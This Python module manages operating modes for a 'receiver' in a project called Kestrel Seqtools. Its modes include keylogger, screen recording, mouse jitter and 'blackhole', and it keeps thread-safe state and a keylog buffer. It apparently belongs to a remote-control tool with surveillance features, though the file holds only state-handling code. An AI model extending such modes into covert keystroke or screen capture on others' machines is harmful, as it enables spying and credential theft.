"""
Mode management for Kestrel Seqtools
"""

import threading
from enum import Enum


class Mode(Enum):
    """Operating modes for the receiver"""
    NORMAL = "normal"
    KEYLOGGER = "keylogger"
    SCREENRECORD = "screenrecord"
    MOUSE_JITTER = "mouse_jitter"
    BLACKHOLE = "blackhole"


class ModeManager:
    """Manages the current operating mode and active tasks"""
    
    def __init__(self):
        self.current_mode = Mode.NORMAL
        self.active_thread = None
        self.stop_event = threading.Event()
        self.mode_lock = threading.Lock()
        
        # Mode-specific data storage
        self.keylog_buffer = []
        self.recording_metadata = {}
    
    def set_mode(self, mode: Mode) -> bool:
        """
        Set the current mode (thread-safe).
        Returns True if successful, False if already in a non-NORMAL mode.
        """
        with self.mode_lock:
            if self.current_mode != Mode.NORMAL and mode != Mode.NORMAL:
                return False
            self.current_mode = mode
            return True
    
    def reset_mode(self):
        """Reset to NORMAL mode (thread-safe)"""
        with self.mode_lock:
            self.current_mode = Mode.NORMAL
            self.stop_event.clear()
            self.active_thread = None
    
    def signal_stop(self):
        """Signal the active task to stop"""
        self.stop_event.set()
    
    def is_stopping(self) -> bool:
        """Check if stop has been signaled"""
        return self.stop_event.is_set()
    
    def wait_for_thread(self, timeout=5):
        """Wait for active thread to finish"""
        if self.active_thread and self.active_thread.is_alive():
            self.active_thread.join(timeout=timeout)

